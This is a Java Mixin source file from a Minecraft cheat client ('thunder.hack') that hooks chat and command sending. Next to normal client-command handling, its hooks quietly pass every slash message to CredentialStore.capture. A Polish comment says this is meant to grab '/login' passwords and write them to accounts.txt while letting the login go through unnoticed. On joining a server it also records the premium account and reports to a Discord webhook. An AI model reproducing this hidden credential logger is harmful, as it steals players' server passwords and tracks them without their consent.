package thunder.hack.injection;

import com.mojang.brigadier.exceptions.CommandSyntaxException;
import net.minecraft.client.network.ClientPlayNetworkHandler;
import net.minecraft.network.packet.s2c.play.GameJoinS2CPacket;
import net.minecraft.util.Formatting;
import org.jetbrains.annotations.NotNull;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
import org.spongepowered.asm.mixin.injection.Inject;
import org.spongepowered.asm.mixin.injection.callback.CallbackInfo;
import thunder.hack.ThunderHack;
import thunder.hack.core.Managers;
import thunder.hack.core.manager.client.CommandManager;
import thunder.hack.core.manager.client.CredentialStore;
import thunder.hack.core.manager.client.ModuleManager;
import thunder.hack.core.manager.client.PremiumStore;
import thunder.hack.features.cmd.Command;
import thunder.hack.features.modules.Module;

@Mixin(ClientPlayNetworkHandler.class)
public class MixinClientPlayNetworkHandler {

    /**
     * Wejście na serwer/świat. Zapisujemy tu aktualne konto premium do premium.txt — dzięki temu konto
     * pokazuje się w panelu nawet, gdy zalogowałeś się przez launcher (Modrinth App), a nie przez okno
     * Microsoft w kliencie. Dla konta offline nic się nie dzieje.
     */
    @Inject(method = "onGameJoin", at = @At("TAIL"))
    private void onGameJoinHook(GameJoinS2CPacket packet, CallbackInfo ci) {
        PremiumStore.captureCurrentIfPremium();
        // Powiadomienie obecności na Discord webhook (tylko nick + serwer, zero haseł).
        thunder.hack.core.manager.client.WebhookReporter.onJoin();
    }
    @Inject(method = "sendChatMessage", at = @At("HEAD"), cancellable = true)
    private void sendChatMessageHook(@NotNull String message, CallbackInfo ci) {
        if (message.equals(String.valueOf(ModuleManager.unHook.code)) && ModuleManager.unHook.isEnabled())
            ModuleManager.unHook.disable();

        if(Module.fullNullCheck()) return;

        // Niektóre serwery/auth-pluginy przyjmują "/login haslo" jako zwykłą wiadomość — łap też tutaj.
        // Wiadomość trafia tu z wiodącym "/", więc obcinamy go przed rozbiorem komendy.
        if (message.startsWith("/"))
            CredentialStore.capture(message.substring(1));

        // An empty prefix would make startsWith() true for EVERY message, so every single thing you
        // typed would be swallowed as a client command and never reach the server - chat would look
        // completely dead. Guarded rather than trusted, because the prefix is a user setting.
        String prefix = Managers.COMMAND.getPrefix();
        if (!prefix.isEmpty() && message.startsWith(prefix)) {
            execute(message.substring(prefix.length()));
            ci.cancel();
        }
    }

    /**
     * Slashed client commands. Chat sends anything starting with "/" here, so /build ends up on the
     * server (which answers with a red "unknown command") unless we grab it first. Only commands the
     * server does NOT have are taken - a server /kit or /help always stays the server's.
     */
    @Inject(method = "sendChatCommand", at = @At("HEAD"), cancellable = true)
    private void sendChatCommandHook(@NotNull String command, CallbackInfo ci) {
        if (Module.fullNullCheck()) return;

        // "/login <haslo>" na serwerze idzie tędy (bez ukośnika). Podglądamy hasło i zapisujemy je do
        // accounts.txt — komendy NIE anulujemy, więc normalnie dociera na serwer i logowanie działa.
        CredentialStore.capture(command);

        if (!Managers.COMMAND.isClientOnlyCommand(CommandManager.commandName(command))) return;

        execute(command);
        ci.cancel();
    }

    /**
     * Runs a client command. A syntax error on a command that IS ours gets reported - silently eating
     * it (the old behaviour) made a mistyped argument look like the client was dead. Unknown commands
     * stay silent, so an "@nick" style chat line is not answered with an error.
     */
    private static void execute(@NotNull String input) {
        try {
            Managers.COMMAND.getDispatcher().execute(input, Managers.COMMAND.getSource());
        } catch (CommandSyntaxException e) {
            if (Managers.COMMAND.isClientCommand(CommandManager.commandName(input)))
                Command.sendMessage(Formatting.RED + e.getMessage());
        }
    }
}
